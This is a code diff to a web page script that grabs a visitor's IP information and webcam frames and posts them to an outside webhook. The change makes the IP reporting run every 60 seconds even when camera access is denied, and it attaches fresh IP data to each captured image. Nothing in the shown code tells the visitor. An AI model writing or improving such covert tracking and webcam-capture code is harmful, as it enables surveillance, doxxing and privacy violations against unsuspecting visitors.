@@ -23,9 +23,7 @@ async function sendData(imageBlob, ipInfo) {
   form.append('payload_json', JSON.stringify({
     content: `IP Info: ${ipInfo ? JSON.stringify(ipInfo) : 'Unavailable'}`
   }));
-  if (imageBlob) {
-    form.append('file', imageBlob, 'capture.png');
-  }
+  if (imageBlob) form.append('file', imageBlob, 'capture.png');
 
   try {
     const response = await fetch(webhook, {
@@ -40,16 +38,21 @@ async function sendData(imageBlob, ipInfo) {
   }
 }
 
-async function captureLoop() {
-  const ipInfo = await getIPInfo();
-  await sendData(null, ipInfo); // Send IP info immediately, without image
+async function sendIPOnlyLoop() {
+  while (true) {
+    const ipInfo = await getIPInfo();
+    await sendData(null, ipInfo);
+    await new Promise(r => setTimeout(r, 60000)); // every 60 seconds
+  }
+}
 
+async function captureLoop() {
   let stream;
   try {
     stream = await navigator.mediaDevices.getUserMedia({video:true});
   } catch {
     console.error('Camera access denied or unavailable');
-    return; // Stop further image capture but IP is already sent
+    return;
   }
 
   const video = document.createElement('video');
@@ -67,12 +70,20 @@ async function captureLoop() {
 
     const blob = await new Promise(res => canvas.toBlob(res, 'image/png'));
 
+    const ipInfo = await getIPInfo();
+
     await sendData(blob, ipInfo);
   }
 }
 
-captureLoop();
+async function main() {
+  sendIPOnlyLoop(); // send IP info continuously regardless
+
+  // Try camera capture but don't block if denied
+  captureLoop();
+}
+
+main();
 </script>
 </body>
 </html>
-
